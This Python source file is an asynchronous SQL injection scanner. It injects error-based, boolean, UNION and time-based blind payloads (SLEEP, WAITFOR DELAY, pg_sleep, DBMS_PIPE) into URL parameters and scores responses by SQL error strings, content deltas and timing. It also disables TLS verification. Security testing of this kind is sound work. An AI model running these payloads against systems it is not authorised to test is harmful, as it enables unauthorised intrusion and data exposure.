"""
sqli_tester.py – Production-hardened SQL injection vulnerability tester.

Hardening applied:
  - SSRFSafeConnector on all outbound requests (DNS rebinding safe)
  - RFC-1123 / URL validation before any request
  - Payloads injected only into detected query parameters (no blind path injection)
  - Detection logic: error-string matching + time-delta (blind) + content-length delta
  - Error-based, union-based hints, boolean-based, and time-based blind detection
  - Per-probe timeout capped (blind probes use longer timeout for timing attacks)
  - Concurrency semaphore prevents flooding; all gather() exceptions suppressed
  - Risk: error_based=CRITICAL, blind_timing=HIGH, boolean=HIGH, union_hint=HIGH
"""

import asyncio
import ipaddress
import re
import time
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import aiohttp
from aiohttp import TCPConnector

# ── SSRF-safe connector ───────────────────────────────────────────────────────
_BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("0.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fe80::/10"),
    ipaddress.ip_network("fc00::/7"),
]


def _is_blocked_ip(addr: str) -> bool:
    try:
        ip = ipaddress.ip_address(addr)
        if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped:
            ip = ip.ipv4_mapped
        return any(ip in net for net in _BLOCKED_NETWORKS)
    except ValueError:
        return False


class SSRFSafeConnector(TCPConnector):
    async def _resolve_host(self, host: str, port: int, traces=None):
        infos = await super()._resolve_host(host, port, traces)
        for info in infos:
            if _is_blocked_ip(info["host"]):
                raise aiohttp.ClientConnectorError(
                    connection_key=None,
                    os_error=OSError(f"SSRF blocked: {info['host']}"),
                )
        return infos


# ── SQL error signatures (compiled for performance) ───────────────────────────
_SQL_ERROR_PATTERNS: list[tuple[str, re.Pattern]] = [
    ("mysql",      re.compile(r"you have an error in your sql syntax|mysql_fetch|mysql_num_rows|warning: mysql", re.I)),
    ("mysqli",     re.compile(r"mysqli_fetch|mysqli::query|mysqli_num_rows", re.I)),
    ("mssql",      re.compile(r"unclosed quotation mark|microsoft sql server|mssql_query|syntax error.*tsql|OLE DB", re.I)),
    ("oracle",     re.compile(r"ORA-\d{4,5}|oracle.*driver|quoted string not properly terminated", re.I)),
    ("postgresql", re.compile(r"pg_query|pg_exec|unterminated quoted string|psql.*error|postgre.*error", re.I)),
    ("sqlite",     re.compile(r"sqlite3?\..*error|sqlite_.*error|near \".*\": syntax error", re.I)),
    ("generic_db", re.compile(r"sql syntax|sql error|database error|db error|jdbc|odbc.*error|invalid query", re.I)),
]

# Union-based SQLi hints (may appear in response body)
_UNION_HINTS: list[re.Pattern] = [
    re.compile(r"\bNULL,NULL\b", re.I),
    re.compile(r"\binformation_schema\b", re.I),
    re.compile(r"\bversion\(\)", re.I),
    re.compile(r"\bsleep\(\d+\)", re.I),
]

# ── Payloads ──────────────────────────────────────────────────────────────────
# Error-based / boolean-based probes (fast, no timing dependency)
ERROR_BOOL_PAYLOADS: list[dict[str, str]] = [
    {"label": "single_quote",          "value": "'"},
    {"label": "double_quote",          "value": '"'},
    {"label": "comment_inline",        "value": "' --"},
    {"label": "comment_hash",          "value": "' #"},
    {"label": "boolean_true",          "value": "' OR '1'='1"},
    {"label": "boolean_false",         "value": "' OR '1'='2"},
    {"label": "stacked_comment",       "value": "'; --"},
    {"label": "or_1eq1_num",           "value": " OR 1=1--"},
    {"label": "and_1eq2",              "value": " AND 1=2--"},
    {"label": "union_1col",            "value": "' UNION SELECT NULL--"},
    {"label": "union_2col",            "value": "' UNION SELECT NULL,NULL--"},
    {"label": "union_version",         "value": "' UNION SELECT @@version,NULL--"},
    {"label": "parenthesis_close",     "value": "')"},
    {"label": "hex_quote",             "value": "0x27"},                    # hex-encoded '
    {"label": "url_encoded_quote",     "value": "%27"},
    {"label": "double_url_encoded",    "value": "%2527"},
]

# Time-based blind payloads (require longer timeout to detect)
BLIND_TIME_PAYLOADS: list[dict] = [
    {"label": "sleep_mysql",      "value": "' AND SLEEP(3)--",         "db": "mysql",   "delay": 3},
    {"label": "sleep_pg",         "value": "'; SELECT pg_sleep(3)--",   "db": "pgsql",   "delay": 3},
    {"label": "waitfor_mssql",    "value": "'; WAITFOR DELAY '0:0:3'--","db": "mssql",   "delay": 3},
    {"label": "sleep_sqlite",     "value": "' AND randomblob(100000000)--", "db": "sqlite", "delay": 3},
    {"label": "dbms_pipe_oracle", "value": "' OR 1=1 AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1)--", "db": "oracle", "delay": 3},
]

# ── Baseline response parameters ──────────────────────────────────────────────
CONTENT_DELTA_THRESHOLD = 0.15   # >15% body size change = potential boolean injection
TIME_DELAY_THRESHOLD = 2.5       # seconds — confirmed blind if delta >= threshold


def _validate_target(target: str) -> str:
    t = target.strip()
    if not t.startswith(("http://", "https://")):
        return f"https://{t}"
    return t


def _inject_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


def _detect_sql_error(body: str) -> list[str]:
    return [label for label, pattern in _SQL_ERROR_PATTERNS if pattern.search(body)]


def _detect_union_hints(body: str) -> list[str]:
    return [f"union_hint_{i}" for i, p in enumerate(_UNION_HINTS) if p.search(body)]


def _risk_label(score: int) -> str:
    if score == 0:
        return "LOW"
    if score <= 2:
        return "MEDIUM"
    if score <= 4:
        return "HIGH"
    return "CRITICAL"


async def _baseline(
    session: aiohttp.ClientSession,
    url: str,
) -> tuple[int, float, str]:
    """Fetch baseline response: (status, elapsed_ms, body)"""
    start = time.monotonic()
    try:
        async with session.get(url, allow_redirects=True) as resp:
            body = await resp.text(errors="replace")
            return resp.status, round((time.monotonic() - start) * 1000, 1), body
    except Exception:
        return 0, 0.0, ""


async def _probe(
    session: aiohttp.ClientSession,
    url: str,
    param: str,
    payload: dict[str, str],
    semaphore: asyncio.Semaphore,
    baseline_len: int,
    timeout: aiohttp.ClientTimeout,
) -> dict[str, Any]:
    probe_url = _inject_param(url, param, payload["value"])
    result: dict[str, Any] = {
        "param": param,
        "payload_label": payload["label"],
        "probe_url": probe_url,
        "status": None,
        "elapsed_ms": None,
        "sql_errors": [],
        "union_hints": [],
        "content_delta": None,
        "vulnerable": False,
        "detection_method": None,
    }
    async with semaphore:
        start = time.monotonic()
        try:
            async with session.get(probe_url, allow_redirects=True) as resp:
                elapsed = round((time.monotonic() - start) * 1000, 1)
                body = await resp.text(errors="replace")
                result["status"] = resp.status
                result["elapsed_ms"] = elapsed

                sql_errors = _detect_sql_error(body)
                union_hints = _detect_union_hints(body)
                delta = abs(len(body) - baseline_len) / max(baseline_len, 1)

                result["sql_errors"] = sql_errors
                result["union_hints"] = union_hints
                result["content_delta"] = round(delta, 3)

                if sql_errors:
                    result["vulnerable"] = True
                    result["detection_method"] = "error_based"
                elif union_hints:
                    result["vulnerable"] = True
                    result["detection_method"] = "union_hint"
                elif delta > CONTENT_DELTA_THRESHOLD and resp.status != 404:
                    result["vulnerable"] = True
                    result["detection_method"] = "boolean_content_delta"

        except Exception as exc:
            result["error"] = str(exc)
    return result


async def _probe_blind(
    session: aiohttp.ClientSession,
    url: str,
    param: str,
    payload: dict,
    semaphore: asyncio.Semaphore,
    baseline_elapsed: float,
) -> dict[str, Any]:
    probe_url = _inject_param(url, param, payload["value"])
    result: dict[str, Any] = {
        "param": param,
        "payload_label": payload["label"],
        "db_hint": payload.get("db", "unknown"),
        "probe_url": probe_url,
        "status": None,
        "elapsed_ms": None,
        "delay_detected": False,
        "vulnerable": False,
        "detection_method": None,
    }
    async with semaphore:
        start = time.monotonic()
        try:
            async with session.get(probe_url, allow_redirects=True) as resp:
                elapsed = round((time.monotonic() - start) * 1000, 1)
                await resp.read()
                result["status"] = resp.status
                result["elapsed_ms"] = elapsed

                expected_delay_ms = payload["delay"] * 1000
                actual_extra = elapsed - baseline_elapsed
                if actual_extra >= (expected_delay_ms - 500):  # 500ms margin
                    result["delay_detected"] = True
                    result["vulnerable"] = True
                    result["detection_method"] = "time_based_blind"
                    result["delay_delta_ms"] = round(actual_extra, 1)

        except asyncio.TimeoutError:
            # Timeout itself is a strong indicator for time-based blind
            result["elapsed_ms"] = round((time.monotonic() - start) * 1000, 1)
            result["delay_detected"] = True
            result["vulnerable"] = True
            result["detection_method"] = "time_based_blind_timeout"
        except Exception as exc:
            result["error"] = str(exc)
    return result


async def test_sqli(target: str, options: dict | None = None) -> dict[str, Any]:
    """
    SQL injection tester.

    Parameters
    ----------
    target  : URL (with or without query parameters) or hostname
    options : optional
        timeout      – per-request timeout seconds (default 8)
        blind_timeout – timeout for time-based blind probes (default 12)
        concurrency  – parallel probe semaphore (default 10)
        params       – list[str] of parameter names to test (auto-detected if omitted)

    Returns
    -------
    dict with: target, params_tested, probes_run, sqli_findings,
               risk, findings
    """
    options = options or {}
    url = _validate_target(target)
    timeout_secs: int = options.get("timeout", 8)
    blind_timeout_secs: int = options.get("blind_timeout", 12)
    concurrency: int = options.get("concurrency", 10)
    custom_params: list[str] | None = options.get("params")

    connector = SSRFSafeConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=timeout_secs)
    blind_timeout_obj = aiohttp.ClientTimeout(total=blind_timeout_secs)
    req_headers = {"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}
    semaphore = asyncio.Semaphore(concurrency)

    findings: list[str] = []
    risk_score = 0

    # ── Detect injectable parameters ──────────────────────────────────────────
    parsed = urlparse(url)
    all_params = list(parse_qs(parsed.query).keys())
    if custom_params:
        params_to_test = custom_params
    elif all_params:
        params_to_test = all_params
    else:
        # No query params found — try common ones for POST-style discovery
        params_to_test = ["id", "q", "search", "query", "user", "username", "page", "cat"]

    sqli_hits: list[dict] = []
    blind_hits: list[dict] = []
    total_probes = 0

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=req_headers
    ) as session:
        # Baseline for each parameter
        b_status, b_elapsed_ms, b_body = await _baseline(session, url)
        b_len = len(b_body)

        # ── Error-based and boolean probes ─────────────────────────────────
        error_tasks = [
            _probe(session, url, param, payload, semaphore, b_len, timeout)
            for param in params_to_test
            for payload in ERROR_BOOL_PAYLOADS
        ]
        error_results = await asyncio.gather(*error_tasks, return_exceptions=True)
        total_probes += len(error_tasks)

        for r in error_results:
            if isinstance(r, dict) and r.get("vulnerable"):
                sqli_hits.append(r)

        # ── Time-based blind probes (only if no error-based hits yet) ─────
        # Using blind_timeout session for these
        if not sqli_hits:
            async with aiohttp.ClientSession(
                connector=SSRFSafeConnector(ssl=False),
                timeout=blind_timeout_obj,
                headers=req_headers,
            ) as blind_session:
                blind_tasks = [
                    _probe_blind(blind_session, url, param, payload, semaphore, b_elapsed_ms)
                    for param in params_to_test[:3]   # limit params to 3 to cap request volume
                    for payload in BLIND_TIME_PAYLOADS
                ]
                blind_results = await asyncio.gather(*blind_tasks, return_exceptions=True)
                total_probes += len(blind_tasks)

                for r in blind_results:
                    if isinstance(r, dict) and r.get("vulnerable"):
                        blind_hits.append(r)

    # ── Findings generation ───────────────────────────────────────────────────
    for hit in sqli_hits:
        method = hit.get("detection_method", "unknown")
        if method == "error_based":
            findings.append(
                f"CRITICAL: SQL error-based injection — param='{hit['param']}' "
                f"payload='{hit['payload_label']}' errors={hit['sql_errors']}"
            )
            risk_score += 4
        elif method == "union_hint":
            findings.append(
                f"HIGH: Possible UNION-based SQLi — param='{hit['param']}' "
                f"payload='{hit['payload_label']}' hints={hit['union_hints']}"
            )
            risk_score += 3
        elif method == "boolean_content_delta":
            findings.append(
                f"HIGH: Boolean-based SQLi (content delta {hit['content_delta']:.0%}) — "
                f"param='{hit['param']}' payload='{hit['payload_label']}'"
            )
            risk_score += 2

    for hit in blind_hits:
        findings.append(
            f"HIGH: Time-based blind SQLi ({hit['detection_method']}) — "
            f"param='{hit['param']}' db_hint='{hit['db_hint']}' "
            f"delay_delta={hit.get('delay_delta_ms', 'timeout')}ms"
        )
        risk_score += 3

    if not findings:
        findings.append(
            f"INFO: No SQL injection indicators found across {total_probes} probes. "
            "POST body and JSON API parameters require manual or dedicated testing."
        )

    return {
        "target": url,
        "params_tested": params_to_test,
        "baseline_status": b_status,
        "probes_run": total_probes,
        "sqli_findings": sqli_hits + blind_hits,
        "risk": _risk_label(risk_score),
        "risk_score": risk_score,
        "findings": findings,
    }
